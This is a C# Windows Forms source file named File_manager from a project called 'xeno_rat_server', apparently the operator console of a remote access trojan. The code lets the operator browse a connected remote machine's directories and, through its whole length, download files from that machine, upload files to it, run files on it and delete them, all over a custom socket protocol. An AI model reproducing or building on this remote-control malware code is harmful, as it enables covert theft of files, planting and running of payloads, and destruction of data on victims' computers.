using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class File_manager : Form
    {
        Node client;
        FileView FileViewer;
        string currentDirectory = "";
        public File_manager(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            _=InitializeAsync();
        }

        /// <summary>
        /// Initializes the object asynchronously by creating a FileViewer, sending type, and updating the list view.
        /// </summary>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initializes the FileViewer by creating a new instance using the result of the asynchronous operation from <see cref="CreateSubSubNode"/> method.
        /// It then sends the type using the <see cref="FileViewer.SendType"/> method and updates the list view using the <see cref="UpdateListViewNonInvoke"/> method with the current directory.
        /// </remarks>
        public async Task InitializeAsync() 
        {
            FileViewer = new FileView(await CreateSubSubNode(client));
            await FileViewer.SendType();
            await UpdateListViewNonInvoke(currentDirectory);
        }

        /// <summary>
        /// Handles the disconnection of a node.
        /// </summary>
        /// <param name="node">The node to be handled.</param>
        /// <remarks>
        /// If the provided <paramref name="node"/> is the client, it disconnects the FileViewer client if it exists.
        /// If the current instance is not disposed, it closes the form using the <see cref="System.Windows.Forms.Control.Invoke(Delegate)"/> method.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (FileViewer != null) 
                { 
                    FileViewer.client.Disconnect();
                }
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Uploads a file from the specified filepath to the given savepath using the asynchronous protocol.
        /// </summary>
        /// <param name="filepath">The path of the file to be uploaded.</param>
        /// <param name="savepath">The path where the file will be saved on the server.</param>
        /// <exception cref="Exception">Thrown when the upload start fails or when there is an error reading the file.</exception>
        /// <remarks>
        /// This method initiates the upload process by creating a sub-sub node and sending the file data in blocks to the server using asynchronous communication.
        /// It updates the progress of the upload in a list view and handles various error scenarios such as failed connections and file write errors.
        /// </remarks>
        public async Task FileUpload(string filepath, string savepath)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 2 };
            await node.SendAsync(type);
            byte[] bytepath = Encoding.UTF8.GetBytes(savepath);
            await node.SendAsync(bytepath);
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Upload Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not write to that directory/path");
                node.Disconnect();
                return;
            }

            ListViewItem lvi = new ListViewItem();
            lvi.Text = filepath;
            lvi.SubItems.Add("0%");
            lvi.SubItems.Add(savepath);
            lvi.SubItems.Add("Upload");

            listView2.BeginInvoke((Action)(() =>
            {
                listView2.Items.Add(lvi);
            }));

            try
            {
                using (FileStream stream = new FileStream(filepath, FileMode.Open, FileAccess.Read))
                {
                    byte[] block = new byte[500000];
                    int readcount;
                    long totalBytesSent = 0;
                    long fileSize = stream.Length;
                    bool failed = false;
                    while ((readcount = await stream.ReadAsync(block, 0, block.Length)) > 0)
                    {
                        byte[] blockBytes = new byte[readcount];
                        Array.Copy(block, blockBytes, readcount);
                        await node.SendAsync(blockBytes);
                        if (node.Connected() == false)
                        {
                            listView2.BeginInvoke((Action)(() =>
                            {
                                lvi.SubItems[1].Text = "Failed";
                            }));
                            MessageBox.Show("Error sending file!");
                            failed = true;
                            break;
                        }

                        totalBytesSent += readcount;

                        int percentage = (int)((double)totalBytesSent / fileSize * 100);
                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = percentage.ToString() + "%";
                        }));
                    }

                    if (!failed)
                    {
                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = "Complete";
                        }));
                    }
                }

            }
            catch
            {
                listView2.BeginInvoke((Action)(() =>
                {
                    lvi.SubItems[1].Text = "Failed";
                    MessageBox.Show("Error reading file!");
                }));
            }
            await Task.Delay(500);
            node.Disconnect();
        }

        /// <summary>
        /// Downloads a file from the specified path and saves it to the provided save path.
        /// </summary>
        /// <param name="path">The path of the file to be downloaded.</param>
        /// <param name="savepath">The path where the downloaded file will be saved.</param>
        /// <exception cref="Exception">Thrown when the download start fails or if there is an error accessing the file or if the file does not exist or if there is an error with file read or writing to the save file path.</exception>
        /// <remarks>
        /// This method initiates a download of the file from the specified <paramref name="path"/> and saves it to the <paramref name="savepath"/>.
        /// It updates the progress of the download in a list view, showing the percentage of completion.
        /// If the download fails, it displays an appropriate message in the list view.
        /// </remarks>
        public async Task FileDownload(string path, string savepath)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 1 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Download Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not access the file or file does not exist");
                node.Disconnect();
                return;
            }
            long fileSize = Utils.BytesToLong(await node.ReceiveAsync());
            long receivedBytes = 0;
            bool failed=false;
            ListViewItem lvi = new ListViewItem();
            lvi.Text = path;
            lvi.SubItems.Add("0%");
            lvi.SubItems.Add(savepath);
            lvi.SubItems.Add("Download");

            listView2.BeginInvoke((Action)(() =>
            {
                listView2.Items.Add(lvi);
            }));

            try
            {
                using (FileStream fileStream = new FileStream(savepath, FileMode.Create, FileAccess.Write))
                {
                    while (true)
                    {
                        byte[] fileData = await node.ReceiveAsync();
                        if (fileData == null)
                        {
                            if (fileStream.Length == fileSize) 
                            {
                                break;
                            }
                            MessageBox.Show("Error with file read");
                            node.Disconnect();

                            listView2.BeginInvoke((Action)(() =>
                            {
                                lvi.SubItems[1].Text = "Failed";
                            }));
                            failed = true;
                            break;
                        }
                        await fileStream.WriteAsync(fileData, 0, fileData.Length);
                        receivedBytes += fileData.Length;

                        int percentage = (int)((double)receivedBytes / fileSize * 100);

                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = percentage.ToString() + "%";
                        }));

                        if (fileData.Length < 500000)
                        {
                            break;
                        }
                    }
                }

                if (!failed)
                {
                    listView2.BeginInvoke((Action)(() =>
                    {
                        lvi.SubItems[1].Text = "Complete";
                    }));
                }
            }
            catch
            {
                MessageBox.Show("Error writing to save file path");
                node.Disconnect();

                listView2.BeginInvoke((Action)(() =>
                {
                    lvi.SubItems[1].Text = "Failed";
                }));

                return;
            }
            await Task.Delay(500);
            node.Disconnect();
        }

        /// <summary>
        /// Starts a file operation using the specified path.
        /// </summary>
        /// <param name="path">The path of the file to be operated on.</param>
        /// <exception cref="Exception">Thrown when the file operation fails.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initiates a file operation using the provided <paramref name="path"/>.
        /// It creates a sub-sub-node using the <paramref name="client"/> and sends a byte array with a type value of 3 to the node.
        /// It then sends the UTF-8 encoded bytes of the <paramref name="path"/> to the node and receives a response.
        /// If the received data is null, it displays a message box indicating that the file operation start has failed and disconnects the node.
        /// If the received data's first byte is 0, it displays a message box indicating that the file could not be opened or does not exist and disconnects the node.
        /// </remarks>
        public async Task StartFile(string path) 
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 3 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("OpenFile Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not open the file or file does not exist");
                node.Disconnect();
                return;
            }
        }

        /// <summary>
        /// Deletes a file at the specified path.
        /// </summary>
        /// <param name="path">The path of the file to be deleted.</param>
        /// <exception cref="Exception">Thrown when the file deletion process fails.</exception>
        /// <returns>No return value.</returns>
        /// <remarks>
        /// This method sends a delete request to the server for the file located at the specified <paramref name="path"/>.
        /// If the deletion process fails, an exception is thrown.
        /// </remarks>
        public async Task DeleteFile(string path)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 4 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Delete Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not delete the file or file does not exist");
                node.Disconnect();
                return;
            }
        }

        /// <summary>
        /// Updates the list view without invoking the UI thread, using the provided file path.
        /// </summary>
        /// <param name="path">The path of the directory to be updated in the list view.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously retrieves file information using the <see cref="FileViewer.GetInfo"/> method and updates the list view with the directories and files found at the specified path.
        /// If the file information retrieval is unsuccessful, a message box is displayed indicating the problem, and the method returns without further processing.
        /// The current directory is updated to the specified path, and the text box displaying the current directory is also updated.
        /// The list view is then updated by clearing its items, adding a parent directory item if the path is not empty, and adding items for each directory and file found in the retrieved file data.
        /// Finally, the list view update is completed by ending the update operation.
        /// </remarks>
        private async Task UpdateListViewNonInvoke(string path)
        {
            FileData Data = await FileViewer.GetInfo(path);
            if (!Data.sucess)
            {
                textBox1.Text = currentDirectory;
                MessageBox.Show("There was a problem access that Directory, most likely access denied");
                return;
            }
            currentDirectory = path;
            textBox1.Text = currentDirectory;
            listView1.BeginUpdate();
            listView1.Items.Clear();
            if (path != "")
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = path;
                lvi.Text = "..";
                lvi.SubItems.Add("Directory");
                listView1.Items.Add(lvi);
            }
            foreach (string i in Data.Directories)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = i;
                lvi.Text = new DirectoryInfo(i).Name;
                lvi.SubItems.Add("Directory");
                listView1.Items.Add(lvi);
            }
            foreach (string i in Data.Files)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = i;
                lvi.Text = new DirectoryInfo(i).Name;
                lvi.SubItems.Add("File");
                listView1.Items.Add(lvi);

            }
            listView1.EndUpdate();
        }

        /// <summary>
        /// Creates a sub-sub node for the given client node and returns the created node.
        /// </summary>
        /// <param name="client">The client node for which the sub-sub node is to be created.</param>
        /// <returns>The created sub-sub node if successful; otherwise, null.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the creation of the sub-sub node.</exception>
        private async Task<Node> CreateSubSubNode(Node client)
        {
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found =await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Occurs when the selected index of the ListView control changes.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the event when the user double-clicks on an item in the list view.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method retrieves the path, directory, and type of the selected item in the list view.
        /// If the type is not a directory, the method returns.
        /// If the directory is "..", it constructs a new path based on the parent directory and updates the list view asynchronously.
        /// Otherwise, it constructs a new path based on the current directory and the selected directory, and updates the list view asynchronously.
        /// </remarks>
        private async void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            string path = listView1.SelectedItems[0].Tag as string;
            string dir = listView1.SelectedItems[0].SubItems[0].Text;
            string type = listView1.SelectedItems[0].SubItems[1].Text;
            if (type != "Directory") return;
            if (dir == "..")
            {
                string newpath = "";
                if (Path.GetPathRoot(path) != path)
                {
                    newpath = Path.GetFullPath(Path.Combine(path, ".."));
                }
                await UpdateListViewNonInvoke(newpath);
            }
            else 
            { 
                string newpath= Path.GetFullPath(Path.Combine(currentDirectory, dir));
                await UpdateListViewNonInvoke(newpath);
            }
        }

        /// <summary>
        /// Handles the KeyDown event for textBox1 and updates the ListView if the Enter key is pressed.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A KeyEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method asynchronously updates the ListView with the text from textBox1 if the Enter key is pressed.
        /// It sets the KeyEventArgs.Handled and KeyEventArgs.SuppressKeyPress properties to true after updating the ListView.
        /// </remarks>
        private async void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                await UpdateListViewNonInvoke(textBox1.Text);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Occurs when the selected index of the ListView2 control changes.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the click event of the download menu item by initiating the file download process.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method retrieves the necessary information from the selected item in the ListView, creates and configures a SaveFileDialog in a new STA thread, and initiates the file download process by calling the FileDownload method with the selected file's path and the chosen save path.
        /// </remarks>
        private void DownloadMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            // Get the necessary information from the selected item
            string path = (string)selectedItem.Tag;

            // Create and configure the SaveFileDialog in a new STA thread
            Thread staThread = new Thread(() =>
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.FileName = Path.GetFileName(path); // Set the default file name
                saveFileDialog.Filter = "All Files (*.*)|*.*"; // Specify the file type filter

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string savepath = saveFileDialog.FileName;

                    // Call the FileDownload method or perform the download logic here
                    _ = FileDownload(path, savepath);
                }
            });

            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
            staThread.Start();
        }

        /// <summary>
        /// Opens the file associated with the selected menu item.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method retrieves the file path associated with the selected menu item and asynchronously starts the file.
        /// </remarks>
        private async void OpenMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            string filePath = (string)selectedItem.Tag;

            await StartFile(filePath);
        }

        /// <summary>
        /// Deletes the file associated with the selected menu item and updates the list view.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="InvalidCastException">Thrown when the sender or tag is not of the expected type.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method deletes the file specified by the <paramref name="filePath"/> and then updates the list view to reflect the changes.
        /// The file path is obtained from the tag of the selected item in the list view.
        /// The method uses asynchronous operations to delete the file and update the list view without blocking the UI thread.
        /// </remarks>
        private async void DeleteMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            string filePath = (string)selectedItem.Tag;

            await DeleteFile(filePath);
            await UpdateListViewNonInvoke(currentDirectory);

        }

        /// <summary>
        /// Handles the mouse click event on the listView1 control, and displays a context menu with options based on the selected item.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the right mouse button is clicked, and if so, it retrieves the selected item from the listView1 control.
        /// If the selected item is not null and its second subitem's text is "File", a context menu is created with options for Download, Open, and Delete.
        /// Each option is associated with a specific action and is added to the context menu.
        /// The context menu is then displayed at the position of the mouse click within the listView1 control.
        /// </remarks>
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                
                ListViewItem selectedItem = listView1.FocusedItem;
                if (selectedItem != null && selectedItem.SubItems[1].Text=="File")
                {
                    ContextMenu contextMenu = new ContextMenu();

                    // Download option
                    MenuItem downloadMenuItem = new MenuItem("Download");
                    downloadMenuItem.Tag = selectedItem;
                    downloadMenuItem.Click += DownloadMenuItem_Click;
                    contextMenu.MenuItems.Add(downloadMenuItem);

                    // Open option
                    MenuItem openMenuItem = new MenuItem("Open");
                    openMenuItem.Tag = selectedItem;
                    openMenuItem.Click += OpenMenuItem_Click;
                    contextMenu.MenuItems.Add(openMenuItem);

                    // Delete option
                    MenuItem deleteMenuItem = new MenuItem("Delete");
                    deleteMenuItem.Tag = selectedItem;
                    deleteMenuItem.Click += DeleteMenuItem_Click;
                    contextMenu.MenuItems.Add(deleteMenuItem);

                    // Show the context menu at the mouse position
                    contextMenu.Show(listView1, e.Location);
                }
            }
        }

        /// <summary>
        /// Asynchronously updates the list view with the contents of the specified directory without requiring an invoke.
        /// </summary>
        /// <param name="currentDirectory">The directory whose contents will be displayed in the list view.</param>
        /// <remarks>
        /// This method updates the list view with the contents of the specified directory without requiring an invoke, allowing for asynchronous execution.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
           await UpdateListViewNonInvoke(currentDirectory);
        }

        /// <summary>
        /// Handles the click event of button2. Launches a new thread to open a file dialog, select a file, and upload it to a specified location.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="System.InvalidOperationException">Thrown when the thread is in an invalid state for the requested operation.</exception>
        /// <remarks>
        /// This method creates a new thread to handle the file selection and upload process. It sets the thread's apartment state to STA (Single-Threaded Apartment) to ensure proper interaction with the UI components.
        /// The method uses an OpenFileDialog to allow the user to select a file. Once a file is selected, it retrieves the file path, extracts the file name, and combines it with the current directory to create a save path.
        /// The method then calls the FileUpload method to upload the selected file to the specified location.
        /// </remarks>
        private void button2_Click(object sender, EventArgs e)
        {
            Thread staThread = new Thread(() =>
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "Select File";
                openFileDialog.Filter = "All Files (*.*)|*.*";
                openFileDialog.CheckFileExists = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string filePath = openFileDialog.FileName;
                    string fileName = Path.GetFileName(filePath);
                    string savePath = Path.Combine(currentDirectory, fileName);

                    _ = FileUpload(filePath, savePath);
                }
            });

            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
            staThread.Start();
        }


    }
    class FileData 
    {
        public bool sucess = true;
        public List<string> Directories= new List<string>();
        public List<string> Files = new List<string>();
    }
    class FileView
    {
        public Node client;
        public FileView(Node _client)
        {
            client = _client;
        }

        /// <summary>
        /// Sends the specified type using the client's SendAsync method.
        /// </summary>
        /// <remarks>
        /// This method sends the specified type, represented as a byte array, using the client's SendAsync method.
        /// </remarks>
        public async Task SendType() 
        {
            byte[] type = new byte[] { 0 };
            await client.SendAsync(type);
        }

        /// <summary>
        /// Retrieves information about the files and directories at the specified path.
        /// </summary>
        /// <param name="path">The path for which to retrieve information.</param>
        /// <returns>An object containing the list of directories and files at the specified <paramref name="path"/>.</returns>
        /// <remarks>
        /// This method sends a request to the server to retrieve information about the files and directories at the specified <paramref name="path"/>.
        /// If the request is successful, the method populates the <see cref="FileData"/> object with the retrieved information.
        /// If the request fails, the <see cref="FileData.success"/> property is set to false.
        /// </remarks>
        public async Task<FileData> GetInfo(string path) 
        {
            FileData data = new FileData();
            byte[] byte_path = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(byte_path);
            bool worked = (await client.ReceiveAsync())[0]==1;
            if (worked)
            {
                int dirslength = client.sock.BytesToInt(await client.ReceiveAsync());
                for (int _=0;_< dirslength; _++) 
                {
                    data.Directories.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                }
                int fileslength = client.sock.BytesToInt(await client.ReceiveAsync());
                for (int _ = 0; _ < fileslength; _++)
                {
                    data.Files.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                }
            }
            else 
            {
                data.sucess = false;
            }
            return data;

        }
        
    }
}
